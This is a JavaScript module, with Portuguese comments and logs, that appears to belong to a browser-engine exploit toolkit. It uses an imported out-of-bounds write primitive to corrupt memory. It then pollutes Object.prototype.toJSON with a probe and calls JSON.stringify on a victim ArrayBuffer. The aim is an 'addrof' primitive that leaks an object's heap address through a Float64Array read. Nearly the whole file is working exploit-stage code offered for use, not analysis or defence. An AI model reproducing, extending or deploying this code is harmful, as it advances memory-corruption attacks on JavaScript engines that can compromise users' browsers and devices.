// js/script3/testArrayBufferVictimCrash.mjs (V7 - Foco no Efeito da Escrita na Sonda)
import { logS3, PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment,
    isOOBReady
} from '../core_exploit.mjs';

export const FNAME_MODULE_V28 = "OriginalHeisenbug_Addrof_V7_EffectFocusProbe";

const CRITICAL_OOB_WRITE_VALUE = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 64;

let toJSON_call_details_v28 = null;
let object_to_leak_for_addrof_attempt = null;
let victim_ab_ref_for_original_test = null;
let float64_view_ref_for_probe_check = null; // Referência para a view para checagem pós-sonda

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (Base Original) e Foco no Efeito da Escrita ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    toJSON_call_details_v28 = {
        probe_variant: "V7_EffectFocusProbe",
        type_observed_in_probe_after_write: "N/A",
        error_in_toJSON: null,
        probe_called: false,
        addrof_write_attempted: false
    };
    victim_ab_ref_for_original_test = null;
    float64_view_ref_for_probe_check = null;
    object_to_leak_for_addrof_attempt = { marker: Date.now(), id: "MyTargetObject_V7_EffectFocus" };

    let errorCapturedMain = null;
    let stringifyOutput = null;
    const fill_pattern_v7 = 0.123456789101112;

    let addrof_result = {
        success: false,
        leaked_address_as_double: null,
        leaked_address_as_int64: null,
        message: "Addrof não tentado ou Heisenbug não ocorreu / não teve efeito."
    };

    const corruptionTargetOffsetInOOBAB = 0x7C;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("OOB Init falhou ou buffer não está pronto.");
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`  Alvo da corrupção OOB em oob_array_buffer_real: ${toHex(corruptionTargetOffsetInOOBAB)}`, "info", FNAME_CURRENT_TEST);

        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica em ${toHex(corruptionTargetOffsetInOOBAB)} realizada.`, "info", FNAME_CURRENT_TEST);

        await PAUSE_S3(100);

        victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE);
        // MANTENHA a referência à view para checagem *APÓS* stringify
        float64_view_ref_for_probe_check = new Float64Array(victim_ab_ref_for_original_test);
        float64_view_ref_for_probe_check.fill(fill_pattern_v7);

        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View (float64_view_ref_for_probe_check) preenchida com ${float64_view_ref_for_probe_check[0]}.`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: function ProbeCoreExploit_V7_toJSON_EffectFocus() {
                    toJSON_call_details_v28.probe_called = true;
                    toJSON_call_details_v28.probe_variant = "V7_EffectFocusProbe_Executed";

                    try {
                        if (this === victim_ab_ref_for_original_test && object_to_leak_for_addrof_attempt) {
                            logS3(`[Probe_V7_EffectFocus] Tentando escrita de addrof em this[0]...`, "warn");
                            // Tenta a escrita independentemente da checagem de tipo imediata
                            this[0] = object_to_leak_for_addrof_attempt;
                            toJSON_call_details_v28.addrof_write_attempted = true;
                            logS3(`[Probe_V7_EffectFocus] Escrita (supostamente) realizada.`, "info");

                            // Logar o tipo depois, para informação
                            toJSON_call_details_v28.type_observed_in_probe_after_write = Object.prototype.toString.call(this);
                            logS3(`[Probe_V7_EffectFocus] Tipo de 'this' APÓS tentativa de escrita: ${toJSON_call_details_v28.type_observed_in_probe_after_write}`, "leak");
                        } else {
                             logS3(`[Probe_V7_EffectFocus] Condição para escrita não atendida (this não é victim_ab ou objeto alvo é null).`, "info");
                        }
                    } catch (e_write) {
                        toJSON_call_details_v28.error_in_toJSON = `WriteAttemptError: ${e_write.name}: ${e_write.message}`;
                        logS3(`[Probe_V7_EffectFocus] ERRO durante tentativa de escrita em this[0]: ${e_write.message}`, "error");
                        try {
                           toJSON_call_details_v28.type_observed_in_probe_after_write = Object.prototype.toString.call(this);
                        } catch (e_type) { /*ignore*/ }
                    }
                    return { probe_V7_executed: true, attempted_write: toJSON_call_details_v28.addrof_write_attempted };
                },
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com sonda V7 (Foco no Efeito).`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test);

            logS3(`  JSON.stringify(victim_ab_ref_for_original_test) completou. Retorno da sonda: ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            logS3(`  Detalhes FINAIS da sonda (toJSON_call_details_v28): ${toJSON_call_details_v28 ? JSON.stringify(toJSON_call_details_v28) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            // A VERIFICAÇÃO CRÍTICA É FEITA AQUI, LENDO O BUFFER DIRETAMENTE
            if (toJSON_call_details_v28 && toJSON_call_details_v28.addrof_write_attempted) {
                logS3("PASSO 3: Verificando float64_view_ref_for_probe_check[0] APÓS JSON.stringify e tentativa de escrita na sonda...", "warn", FNAME_CURRENT_TEST);
                // Usar a referência à view que foi criada ANTES de stringify
                const value_read_as_double = float64_view_ref_for_probe_check[0];
                addrof_result.leaked_address_as_double = value_read_as_double;
                logS3(`  Valor lido de float64_view_ref_for_probe_check[0]: ${value_read_as_double}`, "leak", FNAME_CURRENT_TEST);

                const double_buffer_for_conversion = new ArrayBuffer(8);
                const double_view_for_conversion = new Float64Array(double_buffer_for_conversion);
                const int32_view_for_double_conversion = new Uint32Array(double_buffer_for_conversion);
                double_view_for_conversion[0] = value_read_as_double;
                addrof_result.leaked_address_as_int64 = new AdvancedInt64(int32_view_for_double_conversion[0], int32_view_for_double_conversion[1]);
                logS3(`  Interpretado como Int64: ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);

                if (value_read_as_double !== 0 && Math.abs(value_read_as_double - fill_pattern_v7) > 1e-9 &&
                    (addrof_result.leaked_address_as_int64.high() < 0x00020000 || (addrof_result.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    logS3("  !!!! VALOR LIDO PARECE UM PONTEIRO POTENCIAL (addrof) !!!!", "vuln", FNAME_CURRENT_TEST);
                    addrof_result.success = true;
                    addrof_result.message = "Escrita para addrof tentada E VALOR DO BUFFER MUDOU sugerindo ponteiro.";
                    if(toJSON_call_details_v28.type_observed_in_probe_after_write === '[object Object]') addrof_result.message += " Sonda observou [object Object] pós-escrita.";
                    document.title = `${FNAME_MODULE_V28}: Addr? ${addrof_result.leaked_address_as_int64.toString(true)}`;
                } else {
                    addrof_result.message = "Escrita para addrof tentada, mas valor lido do buffer não mudou ou não parece ponteiro.";
                    if (Math.abs(value_read_as_double - fill_pattern_v7) < 1e-9) addrof_result.message += " (Buffer não alterado do padrão)";
                    addrof_result.message += ` Tipo obs na sonda: ${toJSON_call_details_v28.type_observed_in_probe_after_write}.`;
                    logS3(`  INFO: ${addrof_result.message} (Valor lido: ${value_read_as_double})`, "warn", FNAME_CURRENT_TEST);
                    document.title = `${FNAME_MODULE_V28}: AddrWrite OK, AddrVal FAIL`;
                }
            } else {
                addrof_result.message = "Escrita para addrof não foi marcada como tentada pela sonda.";
                if(toJSON_call_details_v28 && toJSON_call_details_v28.error_in_toJSON) addrof_result.message += ` Erro na sonda: ${toJSON_call_details_v28.error_in_toJSON}`;
                logS3(`  ALERTA: ${addrof_result.message}`, "error", FNAME_CURRENT_TEST);
                document.title = `${FNAME_MODULE_V28}: AddrWrite SKIPPED`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`  ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: Stringify/Addrof ERR`;
            addrof_result.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28} FALHOU CRITICAMENTE`;
        addrof_result.message = `Erro geral no teste: ${e_outer_main.name}`;
    } finally {
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Addrof: Success=${addrof_result.success}, Msg='${addrof_result.message}'`, addrof_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result.leaked_address_as_int64 && addrof_result.success){
            logS3(`  Addrof (Int64): ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        object_to_leak_for_addrof_attempt = null;
        victim_ab_ref_for_original_test = null;
        float64_view_ref_for_probe_check = null;
    }
    return {
        errorOccurred: errorCapturedMain,
        potentiallyCrashed: false,
        stringifyResult: stringifyOutput,
        toJSON_details: toJSON_call_details_v28,
        addrof_attempt_result: addrof_result
    };
}
